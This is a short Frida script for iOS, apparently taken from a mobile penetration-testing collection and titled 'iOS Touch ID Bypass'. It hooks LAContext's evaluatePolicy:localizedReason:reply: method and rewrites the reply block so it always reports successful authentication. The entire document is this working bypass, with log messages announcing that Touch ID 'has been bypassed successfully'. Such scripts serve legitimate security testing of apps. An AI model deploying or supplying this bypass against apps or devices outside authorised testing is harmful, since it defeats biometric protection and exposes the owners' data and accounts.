/************************************************************************
* Name: iOS Touch ID Bypass
* OS: iOS
* 
* Source: https: * Edited: https: ************************************************************************/
setTimeout(function(){
if (ObjC.available) {
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
console.log("Trying to bypass touch ID...");
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function(error, value) {
console.log("Touch ID has been bypassed successfully!");
return callback(true, null);
};
}
});
} else {
console.log("Objective-C Runtime is not available!");
}
}, 0);
